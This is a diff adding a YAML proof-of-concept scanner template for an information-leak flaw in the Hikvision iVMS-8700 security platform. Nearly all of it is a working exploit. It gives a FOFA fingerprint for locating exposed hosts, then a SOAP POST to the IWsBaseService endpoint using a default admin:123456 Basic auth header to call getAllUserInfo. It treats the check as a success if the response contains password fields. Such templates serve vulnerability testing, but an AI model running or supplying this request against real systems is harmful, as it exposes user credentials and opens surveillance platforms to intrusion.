@@ -1,0 +1,54 @@
+id: poc-yaml-hikvision-ivms-8700-iwsbaseservicehttpsoap11endpoint-information-leak
+info:
+  name: 海康威视-ivms-8700 IWsBaseServiceHttpSoap11Endpoint接口 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: ivms-8700综合安防管理平台
+  fofa: body="/home/locationIndex.action"
+requests:
+- method: POST
+  path: /services/IWsBaseService.IWsBaseServiceHttpSoap11Endpoint
+  headers:
+    Authorization: Basic YWRtaW46MTIzNDU2
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:impl="http://impl.ws.api.base.cms.hikvision.com" xmlns:xsd="http://ws.common.cms.hikvision.com/xsd">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <impl:getAllUserInfo>
+
+    <impl:request>
+
+    <!--type: int-->
+
+    <xsd:pageNo>1</xsd:pageNo>
+
+    <!--type: int-->
+
+    <xsd:pageSize>1</xsd:pageSize>
+
+    </impl:request>
+
+    <!--type: long-->
+
+    <impl:updTime></impl:updTime>
+
+    </impl:getAllUserInfo>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"<ax21:password>") &&
+
+    contains(headers,"text/xml")
+
+    '
+variables: {}
+transport: http
